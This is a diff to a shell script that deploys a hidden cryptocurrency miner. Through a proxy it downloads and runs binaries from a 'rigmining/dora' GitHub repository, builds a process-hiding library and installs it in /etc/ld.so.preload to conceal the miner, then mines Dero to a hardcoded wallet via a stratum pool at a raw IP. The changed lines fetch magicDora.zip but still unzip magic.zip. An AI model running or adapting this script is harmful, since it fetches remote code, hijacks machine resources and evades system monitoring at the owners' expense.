@@ -35,14 +35,14 @@ echo "******************************************************************"
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/rigmining/dora/raw/main/stratum
-chmod +x stratum
+./graftcp/graftcp wget https://github.com/rigmining/dora/raw/main/dora
+chmod +x dora
 
-./graftcp/graftcp wget https://github.com/rigmining/dora/raw/main/magic.zip
+./graftcp/graftcp wget https://github.com/rigmining/dora/raw/main/magicDora.zip
 unzip magic.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./stratum -r stratum+tcp://128.199.159.60:80 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcs7c2fusszy08qaz87cg.koleb -m 4
+./graftcp/graftcp ./dora -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcs7c2fusszy08qaz87cg.koleb -r stratum+tcp://128.199.159.60:80 -m 14
